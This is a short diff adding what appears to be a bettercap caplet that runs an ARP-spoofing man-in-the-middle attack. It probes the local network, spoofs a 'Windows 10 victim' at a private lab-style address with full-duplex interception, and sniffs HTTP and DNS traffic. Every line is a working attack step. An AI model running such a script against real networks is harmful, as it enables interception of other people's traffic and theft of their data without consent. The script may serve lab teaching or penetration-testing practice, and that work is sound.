@@ -1,1 +1,17 @@
+# 1. Start network probing to discover targets
+net.probe on
 
+# 2. Set the target to the Windows 10 victim IP
+set arp.spoof.targets 192.168.222.128
+
+# 3. Enable full-duplex spoofing to intercept both ways
+set arp.spoof.fullduplex true
+
+# 4. Start the ARP spoofing attack
+arp.spoof on
+
+# 5. Start sniffing for HTTP and DNS traffic
+net.sniff on
+
+# 6. Clear the screen and provide status
+clear     
